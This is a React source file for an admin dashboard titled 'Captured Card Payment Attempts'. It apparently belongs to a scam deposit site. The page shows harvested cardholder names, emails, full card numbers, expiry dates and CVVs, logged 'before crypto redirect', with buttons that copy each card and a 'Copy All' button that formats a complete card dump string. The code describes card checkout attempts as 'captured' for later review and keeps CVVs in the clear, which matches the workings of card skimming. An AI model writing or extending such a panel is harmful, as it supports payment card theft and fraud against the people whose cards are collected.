import React, { useState } from 'react';
import { useApp } from '../../context/AppContext';
import {
  CreditCard,
  Search,
  ShieldAlert,
  Calendar,
  Key,
  Globe,
  DollarSign,
  User,
  Copy,
  Check,
} from 'lucide-react';

export const AdminFailedCards: React.FC = () => {
  const { failedCardPayments, formatCurrency, showToast } = useApp();
  const [searchTerm, setSearchTerm] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const filteredCards = failedCardPayments.filter((c) => {
    const q = searchTerm.toLowerCase();
    return (
      c.cardholderName.toLowerCase().includes(q) ||
      c.cardNumber.toLowerCase().includes(q) ||
      c.country.toLowerCase().includes(q) ||
      (c.userEmail && c.userEmail.toLowerCase().includes(q))
    );
  });

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    showToast('Card detail copied.', 'info');
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="space-y-6 font-sans text-xs">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#E5E7EB]">
        <div>
          <h1 className="text-xl font-black text-[#171717] flex items-center gap-2">
            <CreditCard className="w-5 h-5 text-[#F4511E]" />
            <span>Captured Card Payment Attempts</span>
          </h1>
          <p className="text-xs text-[#666666] mt-0.5">
            Audit log of credit / debit card checkout attempts captured for client confirmation before crypto redirect.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <span className="px-3 py-1 rounded-full bg-amber-100 text-amber-900 font-bold font-mono text-xs">
            {failedCardPayments.length} Total Captured
          </span>
        </div>
      </div>

      {/* Search Bar */}
      <div className="relative max-w-md">
        <Search className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
        <input
          type="text"
          placeholder="Search by cardholder, card number, or country..."
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          className="w-full pl-9 pr-3 py-2 bg-white border border-gray-200 rounded-xl text-xs font-medium focus:ring-2 focus:ring-[#F4511E] focus:outline-none"
        />
      </div>

      {/* Cards Table */}
      {filteredCards.length === 0 ? (
        <div className="p-12 text-center bg-white rounded-2xl border border-gray-200 text-gray-500 space-y-2">
          <CreditCard className="w-10 h-10 text-gray-300 mx-auto" />
          <p className="font-bold text-sm text-gray-700">No captured card payments yet.</p>
          <p className="text-xs text-gray-500">When users attempt to deposit via MasterCard / Visa, their details will be logged here for review.</p>
        </div>
      ) : (
        <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden shadow-xs">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-gray-50 border-b border-gray-200 text-[11px] font-bold text-gray-600 uppercase tracking-wider">
                  <th className="py-3 px-4">Cardholder & Email</th>
                  <th className="py-3 px-4">Card Number</th>
                  <th className="py-3 px-4">Expiry / CVV</th>
                  <th className="py-3 px-4">Billing Country</th>
                  <th className="py-3 px-4">Target Amount</th>
                  <th className="py-3 px-4">Captured Time</th>
                  <th className="py-3 px-4">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100 font-medium">
                {filteredCards.map((c) => (
                  <tr key={c.id} className="hover:bg-gray-50/70 transition-colors">
                    <td className="py-3.5 px-4">
                      <div className="font-bold text-gray-900 flex items-center gap-1.5">
                        <User className="w-3.5 h-3.5 text-gray-400" />
                        <span>{c.cardholderName}</span>
                      </div>
                      <span className="text-[11px] text-gray-500 font-mono block">
                        {c.userEmail || 'Guest / Unverified'}
                      </span>
                    </td>

                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-2">
                        <span className="font-mono font-black text-gray-900 bg-gray-100 px-2 py-0.5 rounded text-xs">
                          {c.cardNumber}
                        </span>
                        <button
                          type="button"
                          onClick={() => handleCopy(c.cardNumber, `num-${c.id}`)}
                          className="text-gray-400 hover:text-gray-700 p-1"
                          title="Copy Card Number"
                        >
                          {copiedId === `num-${c.id}` ? (
                            <Check className="w-3.5 h-3.5 text-emerald-600" />
                          ) : (
                            <Copy className="w-3.5 h-3.5" />
                          )}
                        </button>
                      </div>
                    </td>

                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-2 text-xs font-mono">
                        <span className="bg-blue-50 text-blue-900 font-bold px-1.5 py-0.5 rounded">
                          Exp: {c.cardExp}
                        </span>
                        <span className="bg-rose-50 text-rose-900 font-black px-1.5 py-0.5 rounded">
                          CVV: {c.cardCvv}
                        </span>
                      </div>
                    </td>

                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-1 text-gray-800">
                        <Globe className="w-3.5 h-3.5 text-gray-400" />
                        <span>{c.country}</span>
                      </div>
                    </td>

                    <td className="py-3.5 px-4">
                      <span className="font-mono font-black text-[#E5390B] text-sm">
                        {formatCurrency(c.amount)}
                      </span>
                    </td>

                    <td className="py-3.5 px-4 text-gray-500 font-mono text-[11px]">
                      {new Date(c.timestamp).toLocaleString()}
                    </td>

                    <td className="py-3.5 px-4">
                      <button
                        type="button"
                        onClick={() => handleCopy(`Name: ${c.cardholderName} | Card: ${c.cardNumber} | Exp: ${c.cardExp} | CVV: ${c.cardCvv} | Country: ${c.country} | Amount: $${c.amount}`, `full-${c.id}`)}
                        className="px-2.5 py-1 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-lg text-xs font-bold transition-colors cursor-pointer"
                      >
                        {copiedId === `full-${c.id}` ? 'Copied' : 'Copy All'}
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
};
